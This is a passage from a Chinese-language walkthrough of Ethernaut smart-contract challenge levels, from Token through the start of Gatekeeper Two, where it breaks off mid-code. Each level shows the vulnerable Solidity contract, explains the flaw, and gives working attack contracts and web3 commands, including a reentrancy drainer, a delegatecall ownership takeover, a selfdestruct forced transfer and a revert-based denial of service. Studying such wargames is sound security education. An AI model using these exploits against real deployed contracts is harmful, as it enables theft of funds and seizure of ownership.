function_">balanceOf</span>(<span class="params">address _owner</span>) public view returns (uint balance) &#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每个人初始token20</p>
<p><code>balances</code> 和 <code>value</code> 都是 uint，整数溢出，给任意地址转账21，就能让自己账户20-21产生溢出</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transfer</span>(<span class="string">&#x27;0xB2659555846f4732008152C78dEA6B7Acba11B4D&#x27;</span>,<span class="number">21</span>)</span><br><span class="line"><span class="comment">//给任意地址转21，这里拿实例地址用了</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)</span><br><span class="line"><span class="comment">//查看自己的token，变为一个很大的数</span></span><br></pre></td></tr></table></figure>

<h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>拿到合约所有权</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Delegate</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _owner</span>) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Delegation</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  <span class="title class_">Delegate</span> delegate;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _delegateAddress</span>) public &#123;</span><br><span class="line">    delegate = <span class="title class_">Delegate</span>(_delegateAddress);</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">fallback</span>() external &#123;</span><br><span class="line">    (bool result,) = <span class="title function_">address</span>(delegate).<span class="title function_">delegatecall</span>(msg.<span class="property">data</span>);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">      <span class="variable language_">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两种底层调用方式</p>
<blockquote>
<p>call 外部调用时，上下文是外部合约</p>
<p>delegatecall 外部调用时，上下文是调用合约，相当于把代码复制过来在当前的环境执行</p>
</blockquote>
<img src="https://s3.bmp.ovh/imgs/2022/07/13/3bdbfef7a4655178.png" alt="7.png"  />

<p>因此这里调用Delegate的pwn()函数就能得到Delegation的所有权</p>
<p>在solidty中可以通过method id（函数选择器）来调用函数</p>
<p>当给call传入的第一个参数是四个字节时，那么合约就会默认这四个自己就是要调用的函数，它会把这四个字节当作函数的id来寻找调用函数，而一个函数的id在以太坊的函数选择器的生成规则里就是其函数签名的sha3的前4个bytes，函数签名就是带有括号括起来的参数类型列表的函数名称。</p>
<p>因此整个过程是，通过fallback函数，传入的数据是pwn()的id，调用指定的pwn()函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>:web3.<span class="property">utils</span>.<span class="title function_">sha3</span>(<span class="string">&quot;pwn()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)&#125;)</span><br><span class="line"><span class="comment">//or，keccak256就是sha3</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>:web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;pwn()&quot;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>让合约的balance大于0</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Force</span> &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =ø= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure>

<p>好一个源码，没有接受转账的， 考虑<code>selfdestruct</code> 自毁合约强转</p>
<p>一个合约在自毁的时候，可以将余额全部强制转到另一个地址上</p>
<p>因此构造一个第三方合约，然后自毁，强制把合约里的资金转给实例合约即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) public payable &#123;&#125;  <span class="comment">// 部署的时候转一点eth</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exp</span>(<span class="params">address _challenge</span>) public &#123;</span><br><span class="line">        address payable challenge = <span class="title function_">payable</span>(_challenge);	<span class="comment">//强转类型为address payable</span></span><br><span class="line">        <span class="title function_">selfdestruct</span>(challenge);<span class="comment">//自毁强转</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>目标是打开vault，locked等于false</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Vault</span> &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">bytes32 _password</span>) public &#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">unlock</span>(<span class="params">bytes32 _password</span>) public &#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>区块链上的所有信息是公开的</li>
<li>可以用 <code>web3</code> 的 <code>getStorageAt</code> 来访问合约里变量的值</li>
</ul>
<p>getStorageAt函数可以让我们访问合约里状态变量的值，它的两个参数里第一个是合约的地址，第二个则是变量位置position，它是按照变量声明的顺序从0开始，顺次加1</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">1</span>, <span class="keyword">function</span>(<span class="params">x, y</span>) &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(y)&#125;)</span><br><span class="line"><span class="comment">//得到password的byte形式</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;</span>)</span><br><span class="line"><span class="comment">//传入解锁即可</span></span><br></pre></td></tr></table></figure>

<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><p>阻止其他人成为 King</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">King</span> &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;  </span><br><span class="line">    king = msg.<span class="property">sender</span>;</span><br><span class="line">    prize = msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">value</span> &gt;= prize || msg.<span class="property">sender</span> == owner);</span><br><span class="line">    king.<span class="title function_">transfer</span>(msg.<span class="property">value</span>);</span><br><span class="line">    king = msg.<span class="property">sender</span>;</span><br><span class="line">    prize = msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_king</span>(<span class="params"></span>) public view returns (address payable) &#123;</span><br><span class="line">    <span class="keyword">return</span> king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要是address.transfer()，当发送失败时会回滚状态</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">fromWei</span>(<span class="keyword">await</span> contract.<span class="title function_">prize</span>())<span class="comment">//查看目前价格，是0.001ether</span></span><br></pre></td></tr></table></figure>

<p>Solidity中几种转账方式：</p>
<ul>
<li><strong>address.transfer()</strong><br>当发送失败时会 throw ；回滚状态<br>只会传递部分 Gas 供调用，防止重入，2300gas限制</li>
<li><strong>address.send()</strong><br>当发送失败时会返回 false<br>只会传递部分 Gas 供调用，防止重入，2300gas限制</li>
<li><strong>address.call.value()()</strong><br>当发送失败时会返回 false<br>传递所有可用 Gas 供调用，不能有效防止重入</li>
</ul>
<p>当 transfer 调用失败时会回滚状态，所以只要前任国王拒绝接受转账就可以一直是国王</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span> &#123;</span><br><span class="line">    address payable instance;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address payable _address</span>) public payable &#123;</span><br><span class="line">        instance = _address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hack</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        instance.<span class="property">call</span>.<span class="title function_">value</span>(<span class="number">0.001</span> ether)(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">fallback</span>() external &#123;</span><br><span class="line">        <span class="title function_">revert</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署时传0.001ether，然后调用hack</p>
<p>注意一个小坑，交易的时候，要手动加大gas的限制，否则会报out of gas错误，不知道为什么……</p>
<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>把合约账户的所有钱转出来</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Reentrance</span> &#123;</span><br><span class="line">  </span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">donate</span>(<span class="params">address _to</span>) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].<span class="title function_">add</span>(msg.<span class="property">value</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address _who</span>) public view returns (uint balance) &#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint _amount</span>) public &#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.<span class="property">sender</span>] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.<span class="property">sender</span>.<span class="property">call</span>&#123;<span class="attr">value</span>:_amount&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.<span class="property">sender</span>] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重入攻击</p>
<p>由于发送ether后才更新余额，同时call会调用转账地址的 fallback</p>
<p>如果 fallback 里再次调用了 withdraw ，由于没更新余额，if判断还是能通过，就会递归转账</p>
<p>这里的<code>address.call.value()()</code> 函数，传递了所有可用 <code>gas</code> 供调用，是可以成功执行递归的前提条件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(contract.<span class="property">address</span>)</span><br><span class="line"><span class="comment">//查看实例合约的余额，0.001 ether</span></span><br></pre></td></tr></table></figure>

<p>部署一个第三方合约</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Reentrance</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">donate</span>(<span class="params">address _to</span>) external payable ;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint _amount</span>) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span> &#123;</span><br><span class="line">	<span class="title class_">Reentrance</span> instance;</span><br><span class="line">	<span class="title function_">constructor</span>(<span class="params">address payable addr</span>) public payable &#123;</span><br><span class="line">		instance = <span class="title class_">Reentrance</span>(addr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">call_donate</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">		instance.<span class="property">donate</span>.<span class="title function_">value</span>(msg.<span class="property">value</span>)(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">call_withdraw</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">		instance.<span class="title function_">withdraw</span>(<span class="number">0.001</span> ether);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_">fallback</span>() external payable &#123;</span><br><span class="line">		instance.<span class="title function_">withdraw</span>(<span class="number">0.001</span> ether);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先call_donate()转0.001 ether，然后调用call_withdraw()，再次查看余额发现变为0</p>
<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>到达Building最高层，楼顶，也就是top&#x3D;true</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Building</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">isLastFloor</span>(<span class="params">uint</span>) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Elevator</span> &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">goTo</span>(<span class="params">uint _floor</span>) public &#123;</span><br><span class="line">    <span class="title class_">Building</span> building = <span class="title class_">Building</span>(msg.<span class="property">sender</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.<span class="title function_">isLastFloor</span>(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.<span class="title function_">isLastFloor</span>(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次 <code>building.isLastFloor(_floor)</code> 为false，第二次变成true即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line">interface <span class="title class_">Elevator</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">goTo</span>(<span class="params">uint _floor</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Building</span> &#123;</span><br><span class="line">	bool flag = <span class="literal">true</span>;</span><br><span class="line">	<span class="title class_">Elevator</span> elevator;</span><br><span class="line">	<span class="title function_">constructor</span>(<span class="params">address instance</span>) public &#123;</span><br><span class="line">		elevator = <span class="title class_">Elevator</span>(instance);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">isLastFloor</span>(<span class="params">uint</span>) public returns (bool) &#123;</span><br><span class="line">		flag = !flag;</span><br><span class="line">		<span class="keyword">return</span> flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">hack</span>(<span class="params"></span>) public &#123;</span><br><span class="line">		elevator.<span class="title function_">goTo</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你可以在接口使用 <code>view</code> 函数修改器来防止状态被篡改. <code>pure</code> 修改器也可以防止状态被篡改</p>
<p>这一关的另一个方法是构建一个 view 函数, 这个函数根据不同的输入数据返回不同的结果, 但是不更改状态, 比如 <code>gasleft()</code>.</p>
<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>解锁合约</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Privacy</span> &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = <span class="literal">true</span>;</span><br><span class="line">  uint256 public <span class="variable constant_">ID</span> = block.<span class="property">timestamp</span>;</span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 private awkwardness = <span class="title function_">uint16</span>(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">bytes32[<span class="number">3</span>] memory _data</span>) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">unlock</span>(<span class="params">bytes16 _key</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(_key == <span class="title function_">bytes16</span>(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span></span><br><span class="line"><span class="comment">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span></span><br><span class="line"><span class="comment">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和 Vault 那题有点像</p>
<p>每一个存储位是 32 个字节。根据 Solidity优化规则，当变量所占空间小于 32字节时，如果加上后面的变量也不超过 32 字节的话，会与后面的变量共享空间，因此storage情况为</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bool public locked = <span class="literal">true</span>;			<span class="comment">//0</span></span><br><span class="line">uint256 public <span class="variable constant_">ID</span> = block.<span class="property">timestamp</span>;	<span class="comment">//1</span></span><br><span class="line">uint8 private flattening = <span class="number">10</span>;		<span class="comment">//2</span></span><br><span class="line">uint8 private denomination = <span class="number">255</span>;		<span class="comment">//2</span></span><br><span class="line">uint16 private awkwardness = <span class="title function_">uint16</span>(now);<span class="comment">//2</span></span><br><span class="line">bytes32[<span class="number">3</span>] private data;			<span class="comment">//3,4,5</span></span><br></pre></td></tr></table></figure>

<p>查看data[2]，也就是第5个位置的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">5</span>)	<span class="comment">//data[2]</span></span><br><span class="line"><span class="string">&#x27;0xd41204b6311c26eb1c0fcb4d6401d8bd7400cd647cc9731557137ed8961d77a4&#x27;</span></span><br></pre></td></tr></table></figure>

<p>unlock 需要 bytes16，而且在内部将 data[2] 强制转换为了 bytes16，这会取前 16 字节，所以最后调用 unlock</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&quot;0xd41204b6311c26eb1c0fcb4d6401d8bd&quot;</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">locked</span>()	<span class="comment">//查看解锁情况</span></span><br></pre></td></tr></table></figure>

<h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><p>通过三个modifier的gate</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GatekeeperOne</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateOne</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">sender</span> != tx.<span class="property">origin</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateTwo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">gasleft</span>().<span class="title function_">mod</span>(<span class="number">8191</span>) == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateThree</span>(<span class="params">bytes8 _gateKey</span>) &#123;</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) == <span class="title function_">uint16</span>(<span class="title function_">uint64</span>(_gateKey)), <span class="string">&quot;GatekeeperOne: invalid gateThree part one&quot;</span>);</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) != <span class="title function_">uint64</span>(_gateKey), <span class="string">&quot;GatekeeperOne: invalid gateThree part two&quot;</span>);</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) == <span class="title function_">uint16</span>(tx.<span class="property">origin</span>), <span class="string">&quot;GatekeeperOne: invalid gateThree part three&quot;</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) public gateOne gateTwo <span class="title function_">gateThree</span>(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.<span class="property">origin</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个部署一个第三方合约绕过即可，第二个需要通过调试得知到达这一步的 gasleft() 是多少</p>
<p>第三个需要_gateKey的最后2字节和最后4字节一样，整个8字节和最后4字节不一样，最后4字节和玩家账户的最后2字节一样</p>
<p>设置为0x0000000100005893即可</p>
<p>第1次的时候先随便设置gas，调用enter时，传30000 gas，然后在 <code>etherscan</code> 查看 Geth Debug Trace</p>
<p>查看gasleft() opcodes GAS，得到这一步的剩余gas，为29746（29748 - 这一步消耗的 2 gas &#x3D; 29746，也就是下一步的剩余gas）</p>
<p><a target="_blank" rel="noopener" href="https://github.com/crytic/evm-opcodes">crytic&#x2F;evm-opcodes: Ethereum opcodes and instruction reference (github.com)</a></p>
<img src="https://s3.bmp.ovh/imgs/2022/07/20/f7d1720b1cc11482.png" style="zoom:67%;" />

<p>花费了30000-29746&#x3D;254 gas，可以设置gas为 8191x4+254&#x3D;33018，这样可以通过gateTwo()</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">GatekeeperOne</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line">contract <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="title class_">GatekeeperOne</span> challenge;</span><br><span class="line">    bytes8 gatekey = <span class="number">0x0000000100005893</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _addr</span>) public &#123;</span><br><span class="line">        challenge = <span class="title class_">GatekeeperOne</span>(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exp</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        challenge.<span class="property">enter</span>.<span class="title function_">gas</span>(<span class="number">33018</span>)(gatekey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><p>通过三个gate</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GatekeeperTwo</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateOne</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">sender</span> != tx.<span class="property">origin</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateTwo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := <span class="title function_">extcodesize</span>(<span class="title function_">caller</span>()) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateThree</span>(<span class="params">bytes8 _gateKey</span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">uint64</span>(<span class="title function_">bytes8</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(msg.<span class="property">sender</span>)))) ^ <span class="title function_">uint64</span>(_gateKey) == <span class="title function_">uint64</span>(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) public gateOne gateTwo <span class="title 